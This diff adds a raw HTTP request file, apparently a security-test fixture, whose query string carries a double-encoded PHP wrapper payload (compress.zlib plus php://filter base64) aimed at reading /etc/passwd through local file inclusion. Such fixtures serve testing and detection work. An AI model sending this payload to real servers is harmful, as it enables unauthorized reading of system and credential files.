@@ -1,0 +1,4 @@
+GET /a?s=compress.zlib%253A%252F%252Fphp%253A%252F%252Ffilter%252Fread%253Dconvert.base64-encode%252Fresource%253D%252Fetc%252Fpasswd HTTP/1.1
+Host: demo.example.com
+Connection: close
+
